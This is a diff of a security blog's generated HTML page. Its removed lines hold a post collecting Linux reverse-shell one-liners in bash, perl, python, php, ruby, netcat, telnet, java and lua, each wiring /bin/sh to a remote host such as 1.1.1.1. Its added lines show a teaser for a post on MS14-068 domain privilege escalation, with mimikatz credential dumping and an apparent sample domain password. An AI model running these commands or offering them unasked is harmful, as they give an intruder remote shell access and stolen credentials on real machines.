@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>linux反弹shell的方式收集 · p1gz&#39;s Blog</title>
+    <title>p1gz&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -70,8 +70,6 @@
 
     <link rel="preload" href= /css/style.css?v=20180709 as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= /css/mobile.css?v=20180709 media="(max-width: 980px)">
-    
-    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -196,23 +194,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >p1gz&#39;s Blog.</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">linux反弹shell的方式收集</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>p1gz's Blog.</a>
 </header>
@@ -226,68 +213,24 @@
 
 
 
-height:50vh;
-
 >
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            linux反弹shell的方式收集
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                
-                    <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">281</span> / Reading time: <span class="post-count">2 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/07/12</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -388,84 +331,38 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <p>以下命令均来自互联网.</p>
-<h3 id="1-bash版本："><a href="#1-bash版本：" class="headerlink" title="1.bash版本："></a>1.bash版本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/1.1.1.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<h3 id="2-perl版本"><a href="#2-perl版本" class="headerlink" title="2.perl版本:"></a>2.perl版本:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="1.1.1.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
-<h3 id="3-python版本"><a href="#3-python版本" class="headerlink" title="3.python版本:"></a>3.python版本:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.1.1.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
-<h3 id="4-php版本："><a href="#4-php版本：" class="headerlink" title="4.php版本："></a>4.php版本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("1.1.1.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
-<h3 id="5-ruby版本："><a href="#5-ruby版本：" class="headerlink" title="5.ruby版本："></a>5.ruby版本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("1.1.1.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
-<h3 id="6-nc版本："><a href="#6-nc版本：" class="headerlink" title="6.nc版本："></a>6.nc版本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 1.1.1.1 1234</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p</span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
-<h3 id="7-mknod版本"><a href="#7-mknod版本" class="headerlink" title="7.mknod版本:"></a>7.mknod版本:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 1.1.1.1 8080 0backpipe</span><br></pre></td></tr></table></figure>
-<h3 id="8-java版本："><a href="#8-java版本：" class="headerlink" title="8.java版本："></a>8.java版本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/1.1.1.1/1234;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
-<h3 id="9-lua版本："><a href="#9-lua版本：" class="headerlink" title="9.lua版本："></a>9.lua版本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('1.1.1.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
-    </article>
-    <!-- license  -->
+            <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>原文作者: <a href="https://github.com/p1gz/p1gz.github.io/tree/master">p1gz</a>
-            <p>原文链接: <a href="https://github.com/p1gz/p1gz.github.io/tree/master/2018/07/12/linux反弹shell的方式收集/">https://github.com/p1gz/p1gz.github.io/tree/master/2018/07/12/linux反弹shell的方式收集/</a>
-            <p>发表日期: <a href="https://github.com/p1gz/p1gz.github.io/tree/master/2018/07/12/linux反弹shell的方式收集/">July 12th 2018, 5:15:28 pm</a>
-            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/06/30/域权限提升14-068/" >
+            
+                <span>域权限提升14-068</span>
+        </a>
+        <div class="abstract-content">
+            ^.^不忘初心，方得始终。
+域权限提升14-068MS14-068编号CVE-2014-6324，补丁为3011780，如果自检可在域控制器上使用命令检测 
+1systeminfo |find "3011780"
+1.当获取到一个权限之后，利用溢出或者其他办法尽量把权限提到最高
+2.利用溢出加载mimikataz获取当前系统内的账号密码域信息
+3.通过mimikatz抓取：123456789101112131415域提权的基本要求如下： 账号:zhangsan 密码:2wsx3edc@WSX#EDC 域:ADMINCC（net view /domain） 域管名字:（dsquery se...
         </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/06/30</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/07/13/渗透测试中常见的端口/" title= 渗透测试中常见的端口 >
-                    <div class="nextTitle">渗透测试中常见的端口</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/12/十种MySQL报错注入/" title= 十种MySQL报错注入 >
-                    <div class="prevTitle">十种MySQL报错注入</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
-    <div id="disqus_thread"></div>
-    <script>
-        /**
-    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-        
-        var disqus_config = function () {
-        this.page.url = "https://github.com/p1gz/p1gz.github.io/tree/master/2018/07/12/linux反弹shell的方式收集/";  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = "linux反弹shell的方式收集"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-        };
-        
-        (function () { // DON'T EDIT BELOW THIS LINE
-            var d = document, s = d.createElement('script');
-            s.src = 'https://p1gz-1.disqus.com/embed.js';
-            s.setAttribute('data-timestamp', +new Date());
-            (d.head || d.body).appendChild(s);
-        })();
-
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
-    
-    <!--PC和WAP自适应版-->
-
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -534,24 +431,6 @@ height:50vh;
     </div>
     <!-- toc -->
     
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-bash版本："><span class="toc-number">1.</span> <span class="toc-text">1.bash版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-perl版本"><span class="toc-number">2.</span> <span class="toc-text">2.perl版本:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-python版本"><span class="toc-number">3.</span> <span class="toc-text">3.python版本:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-php版本："><span class="toc-number">4.</span> <span class="toc-text">4.php版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-ruby版本："><span class="toc-number">5.</span> <span class="toc-text">5.ruby版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-nc版本："><span class="toc-number">6.</span> <span class="toc-text">6.nc版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-mknod版本"><span class="toc-number">7.</span> <span class="toc-text">7.mknod版本:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-java版本："><span class="toc-number">8.</span> <span class="toc-text">8.java版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-lua版本："><span class="toc-number">9.</span> <span class="toc-text">9.lua版本：</span></a></li></ol>
-    </div>
-    
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
     <ul class="sidebar-tabs sidebar-tabs-active-0">
@@ -573,47 +452,9 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 5
+        Total : 1
         </div>
         <!-- search  -->
         
@@ -624,32 +465,12 @@ top:50vh;
     
     
     
-    <div class="archive-year"> 2018 </div>
+    <div class="archive-year"> 2019 </div>
     <ul class="year-list">
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2018/07/17/nmap高级用法/" >nmap高级用法</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2018/07/13/端口转发集合/" >端口转发集合</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2018/07/13/渗透测试中常见的端口/" >渗透测试中常见的端口</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2018/07/12/linux反弹shell的方式收集/" >linux反弹shell的方式收集</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2018/07/12/十种MySQL报错注入/" >十种MySQL报错注入</a>
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href= "/2019/06/30/域权限提升14-068/" >域权限提升14-068</a>
         </li>
     
     </div>
@@ -722,8 +543,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
